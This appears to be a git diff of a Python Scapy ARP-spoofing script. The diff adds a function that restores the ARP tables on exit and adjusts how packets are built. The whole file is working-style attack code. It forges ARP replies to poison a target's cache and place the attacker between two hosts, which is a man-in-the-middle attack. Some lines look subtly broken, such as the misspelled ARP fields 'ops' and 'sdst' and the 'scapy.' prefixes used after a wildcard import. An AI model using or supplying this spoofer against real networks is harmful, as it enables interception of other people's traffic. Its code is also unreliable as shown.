@@ -6,22 +6,26 @@ Created on 13 Apr 2021
 #!/usr/bin/python3
 
 
-from scapy.layers.l2 import ARP, Ether
+#from scapy.layers.l2 import ARP, Ether
 from scapy.all import *
 
-
-
+def restore(destination_ip, source_ip):
+    target_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(ops=2, pdst=destination_ip, hwdst=target_mac,sdst=source_ip, hwsrc=source_mac)
+    scapy.send(packet, verbose=False)
+    
 def get_mac(ip):
-    arp_request = ARP(pdst=ip)
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     finalpacket = broadcast/arp_request
-    answer = srp(finalpacket, timeout=2, verbose=False)[0]
+    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
     mac = answer[0][1].hwsrc
     return(mac)
     
 def spoof_arp(target_ip, spoofed_ip):
-    mac = get_mac(target_ip, spoofed_ip)
-    packet = ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
+    mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
     scapy.send(packet, verbose=False)
     
 
@@ -35,6 +39,8 @@ def main():
             spoof_arp(target_ip, spoofed_ip)
              
     except KeyboardInterrupt:
+        restore(target_ip, spoofed_ip)
+        restore(spoofed_ip,target_ip)
         exit(0)
 
 main()
